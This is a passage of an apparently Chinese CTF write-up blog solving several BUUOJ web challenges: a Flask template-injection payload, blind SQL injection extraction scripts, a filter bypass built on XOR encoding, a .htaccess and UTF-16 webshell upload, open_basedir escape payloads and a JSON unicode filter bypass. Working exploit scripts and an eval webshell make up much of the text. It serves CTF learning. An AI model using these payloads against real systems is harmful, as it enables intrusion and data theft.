class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">90.0</span><span class="number">.4430</span><span class="number">.93</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryrGKCBY7qhFd3TrwA</span></span><br><span class="line"><span class="comment">Content-Length: 172</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.sh&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">cat /flag</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryrGKCBY7qhFd3TrwA--</span></span><br></pre></td></tr></table></figure><h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p>简单的ssti题，但是需要写代码查找所需类的位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> html</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">170</span>, <span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = <span class="string">&quot;http://9cf6a01e-8851-4fbe-a9d1-586bcb300271.node3.buuoj.cn/?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;]&#125;&#125;&quot;</span></span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        res = re.findall(<span class="string">&quot;&lt;h2&gt;You searched for:&lt;\/h2&gt;\W+&lt;h3&gt;(.*)&lt;\/h3&gt;&quot;</span>, r.text)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="comment"># print(res)</span></span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        res = html.unescape(res[<span class="number">0</span>])</span><br><span class="line">        print(<span class="built_in">str</span>(i) + <span class="string">&quot; | &quot;</span> + res)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;subprocess.Popen&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">            index = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">print(<span class="string">&quot;indexo of subprocess.Popen:&quot;</span> + <span class="built_in">str</span>(index))</span><br></pre></td></tr></table></figure><p>得到位置之后直接拿flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__mro__[2].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><h3 id="sql无列名-sys-schema-table-statistics"><a href="#sql无列名-sys-schema-table-statistics" class="headerlink" title="sql无列名 + sys.schema_table_statistics"></a>sql无列名 + sys.schema_table_statistics</h3><p>简单sql盲注，一共看到三个回显。</p><blockquote><p>Nu1L</p><p>SQL Injection Checked.</p><p>V&amp;N</p></blockquote><p>ban了许多东西，连infomation_schema也无了，但是可以用sys.schema_table_statistics拿到表名。</p><p>给上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://13abe06b-22f6-4d77-ab52-8cdfd79f2e56.node4.buuoj.cn/&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">sql = <span class="string">&quot;select group_concat(table_name) from sys.schema_table_statistics where table_schema=database()&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        mid = <span class="built_in">int</span>((left + right - <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>: <span class="string">f&quot;2||ascii(substr((<span class="subst">&#123;sql&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Nu1L&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            right = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="comment"># print(f&quot;[*]Left new is: &#123;left&#125; ~ Right new is: &#123;right&#125;&quot;)</span></span><br><span class="line">    result += <span class="built_in">chr</span>(<span class="built_in">int</span>((left + right - <span class="number">1</span>) / <span class="number">2</span>))</span><br><span class="line">    print(<span class="string">f&quot;[+]Result new is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>可以拿到表名，但是拿不到列名，这里就需要无列名注入。</p><p>这里重新说一下无列名注入，在sql里比较两个字符串的大小是和长度无关的，就像c语言里的strcmp。</p><p>举个栗子：</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210723125358768.png"></p><p>不难理解，然后直接写脚本跑flag就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://aef16e32-90b1-4ea9-8cf6-ce25567b080d.node4.buuoj.cn/&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        mid = <span class="built_in">int</span>((left + right - <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>: <span class="string">f&#x27;2||((select 1,&quot;<span class="subst">&#123;result + <span class="built_in">chr</span>(mid)&#125;</span>&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Nu1L&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            right = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="comment"># print(f&quot;[*]Left new is: &#123;left&#125; ~ Right new is: &#123;right&#125;&quot;)</span></span><br><span class="line">    result += <span class="built_in">chr</span>(<span class="built_in">int</span>((left + right - <span class="number">1</span>) / <span class="number">2</span>))</span><br><span class="line">    print(<span class="string">f&quot;[+]Result new is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>拿到flag</p><blockquote><p>flag{e2987a47-cb43-46cf-955a-b25eea7235ee}</p></blockquote><h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><p>题目直接给出了代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    <span class="variable">$userdir</span> = <span class="string">&quot;upload/tmp_&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists(<span class="variable">$userdir</span>))&#123;</span><br><span class="line">    mkdir(<span class="variable">$userdir</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable">$extension</span> = substr(<span class="variable">$name</span>, strrpos(<span class="variable">$name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>,<span class="variable">$extension</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents(<span class="variable">$tmp_name</span>), <span class="string">&#x27;&lt;?&#x27;</span>)!==<span class="literal">False</span>) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype(<span class="variable">$tmp_name</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="variable">$path</span>= <span class="variable">$userdir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$name</span>;</span><br><span class="line">        @move_uploaded_file(<span class="variable">$tmp_name</span>, <span class="variable">$path</span>);</span><br><span class="line">        print_r(<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$hhh</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$hhh</span>)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$hhh</span>)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="variable">$hhh</span>) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$character_type</span> = count_chars(<span class="variable">$hhh</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$character_type</span>)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$hhh</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很明显，过滤了字母数字，然后进一个eval()，上面又给出了一个get_the_flag()函数，这里可以上传文件。从eval那拿flag很明显是很困难的，所以可以换个思路，通过eval()执行get_the_flag()函数，然后进行文件上传一句话木马。</p><h3 id="无数字字母RCE"><a href="#无数字字母RCE" class="headerlink" title="无数字字母RCE"></a>无数字字母RCE</h3><p>首先是要能执行get_the_flag()函数，但是由于把数字和字母都ban了 ，所以这里准备用异或绕</p><p>直接上脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$need</span> = <span class="string">&quot;_GET&quot;</span>;</span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$need</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="number">255</span>; <span class="variable">$j</span>++)&#123;</span><br><span class="line">        <span class="variable">$k</span> = chr(<span class="variable">$j</span>)^chr(<span class="number">255</span>); <span class="comment">// dechex(255)=ff</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$k</span> == <span class="variable">$need</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">            <span class="variable">$payload</span> .= <span class="string">&#x27;%&#x27;</span>.dechex(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br></pre></td></tr></table></figure><p>用phpinfo试试</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210723163944086.png"></p><p>其实这里有个非预期解，在phpinfo里直接搜flag是可以拿到flag的。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210723164025712.png"></p><h3 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h3><p>这里虽然能上传文件了，但是还是需要绕过一些if。</p><p>首先是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>,<span class="variable">$extension</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br></pre></td></tr></table></figure><p>这要绕ph，可以用.htaccess绕过。</p><p>然后是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(mb_strpos(file_get_contents(<span class="variable">$tmp_name</span>), <span class="string">&#x27;&lt;?&#x27;</span>)!==<span class="literal">False</span>) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!exif_imagetype(<span class="variable">$tmp_name</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里则需要绕过’&lt;?’和exif_imagetype()，<a href="https://www.cnblogs.com/tr1ple/p/11207145.html">具体原理看这</a>。</p><p>直接用脚本生成文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">SIZE_HEADER = <span class="string">b&quot;\n\n#define width 1337\n#define height 1337\n\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_php_file</span>(<span class="params">filename, script</span>):</span></span><br><span class="line">    phpfile = <span class="built_in">open</span>(filename, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    phpfile.write(script.encode(<span class="string">&#x27;utf-16be&#x27;</span>))</span><br><span class="line">    phpfile.write(SIZE_HEADER)</span><br><span class="line"></span><br><span class="line">    phpfile.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_htacess</span>():</span></span><br><span class="line">    htaccess = <span class="built_in">open</span>(<span class="string">&#x27;.htaccess&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.write(SIZE_HEADER)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;AddType application/x-httpd-php .lethe\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value zend.multibyte 1\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value zend.detect_unicode 1\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value display_errors 1\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">generate_htacess()</span><br><span class="line"></span><br><span class="line">generate_php_file(<span class="string">&quot;shell.lethe&quot;</span>, <span class="string">&quot;&lt;?php eval($_GET[&#x27;cmd&#x27;]); die(); ?&gt;&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后用postman分别上传。</p><p>成功进入后即可拿到eval()可控权，但是从之前的phpinfo里可以看出，ban了许多函数了，但是我们可以选择读取目录，然后查看flag的位置直接打开。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210723170916176.png"></p><p>这里可以看出题目做了open_basedir限制，所以我们需要绕过open_basedir()。</p><h3 id="open-basedir-绕过"><a href="#open-basedir-绕过" class="headerlink" title="open_basedir()绕过"></a>open_basedir()绕过</h3><p><a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/#ini-set%E8%A6%86%E7%9B%96%E9%97%AE%E9%A2%98%E6%8E%A2%E7%B4%A2">具体原理看这</a>。</p><p>然后构造出一个查看根目录的payload：</p><blockquote><p>cmd=chdir(‘/tmp’);mkdir(‘R0SW’);chdir(‘R0SW’);ini_set(‘open_basedir’,’..’);chdir(‘..’);chdir(‘..’);chdir(‘..’);chdir(‘..’);ini_set(‘open_basedir’,’/‘);var_dump(scandir(‘/‘));</p></blockquote><p>然后直接查看flag，payload:</p><blockquote><p>cmd=chdir(‘/tmp’);mkdir(‘R0SW’);chdir(‘R0SW’);ini_set(‘open_basedir’,’..’);chdir(‘..’);chdir(‘..’);chdir(‘..’);chdir(‘..’);ini_set(‘open_basedir’,’/‘);var_dump(file_get_contents(THis_Is_tHe_F14g));</p></blockquote><p>即可拿到flag</p><blockquote><p>flag{8150a122-84de-4eb3-bae2-1fc81971f572}</p></blockquote><h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><p>好长的名字(x</p><h3 id="json编码绕过"><a href="#json编码绕过" class="headerlink" title="json编码绕过"></a>json编码绕过</h3><p>题目直接给了query.php的源码，直接审计源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$banword</span> = [</span><br><span class="line">    <span class="comment">// no path traversal</span></span><br><span class="line">    <span class="string">&#x27;\.\.&#x27;</span>,</span><br><span class="line">    <span class="comment">// no stream wrapper</span></span><br><span class="line">    <span class="string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,</span><br><span class="line">    <span class="comment">// no data exfiltration</span></span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">  ];</span><br><span class="line">  <span class="variable">$regexp</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$banword</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match(<span class="variable">$regexp</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$body</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$json</span> = json_decode(<span class="variable">$body</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_valid(<span class="variable">$body</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$json</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$json</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$page</span> = <span class="variable">$json</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">  <span class="variable">$content</span> = file_get_contents(<span class="variable">$page</span>);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$content</span> || !is_valid(<span class="variable">$content</span>)) &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable">$content</span> = <span class="string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line"><span class="variable">$content</span> = preg_replace(<span class="string">&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;</span>, <span class="string">&#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="keyword">echo</span> json_encode([<span class="string">&#x27;content&#x27;</span> =&gt; <span class="variable">$content</span>]);</span><br></pre></td></tr></table></figure><p>先是给了个正则过滤函数，过滤掉了一些字符，还不给目录遍历。</p><p>然后是从php://input伪协议中读取，接着json_decode一下，之后就是if查过滤。</p><p>但是，but，if里查的是$body，而不是$json，那么这里就好绕了，我们只需要用一个json_decode能解出来的，而php不能解出来的编码即可绕过，那就是unicode编码。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210724110131492.png"></p><p>然后直接burpsuite里post就行了。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210724110227147.png"></p><p>拿到flag</p><blockquote><p>flag{87cab010-10db-422e-8687-246e2406df00}</p></blockquote><h2 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h2><h3 id="BurpSuite拦截"><a href="#BurpSuite拦截" class="headerlink" title="BurpSuite拦截"></a>BurpSuite拦截</h3><p>打开题目发现页面会自动跳转，跳转到一个什么也没有的/die/，用BurpSuite拦一拦。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210724141342373.png"></p><p>发现一个/chase/，直接跳转进去。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210724141525502.png"></p><p>有三个都是进/die/的，有一个进了/leftt/，跟进去。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210724141622040.png"></p><p>有个/shoot/，跟进去。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210724141847790.png"></p><p>跟到/door/之后需要查看door.js。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_door</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> all_radio = <span class="built_in">document</span>.getElementById(<span class="string">&quot;door_form&quot;</span>).elements;</span><br><span class="line">  <span class="keyword">var</span> guess = <span 